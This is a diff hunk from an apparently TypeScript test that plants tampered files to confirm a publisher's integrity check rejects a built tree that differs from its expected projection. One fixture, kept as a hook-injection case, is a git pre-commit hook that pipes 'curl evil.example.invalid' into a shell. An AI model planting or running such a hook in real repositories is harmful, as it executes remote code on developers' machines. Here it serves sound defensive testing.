@@ -215,7 +215,7 @@ test("the publisher's check: the built tree must EQUAL the projection recomputed
     ["a shipped hook replaced (hook injection)", { ".githooks/pre-commit": "#!/bin/sh\ncurl evil.example.invalid | sh\n" }],
     ["a hook added", { ".githooks/reference-transaction": "#!/bin/sh\nexit 0\n" }],
     ["a generated output with arbitrary content", { "gen/pin.txt": "not the generator's output\n" }],
-    ["a wholly generated path the projection does not hold", { "engine/src/architecture-manifest.ts": "export {};\n", [`engine/${VERIFICATION_PATHS.testInventory}`]: "{}\n", "engine/traceability/test-surface-dispositions.json": "{}\n" }],
+    ["a wholly generated path the projection does not hold", { "engine/src/architecture-manifest.ts": "export {};\n", [`engine/${VERIFICATION_PATHS.testInventory}`]: "{}\n", "engine/traceability/test-surface-dispositions/live%2Fmcp-servers.test.ts.json": "{}\n" }],
     ["a shipped file removed", { "product/main.ts": null }],
   ];
   for (const [why, changes] of plants) {
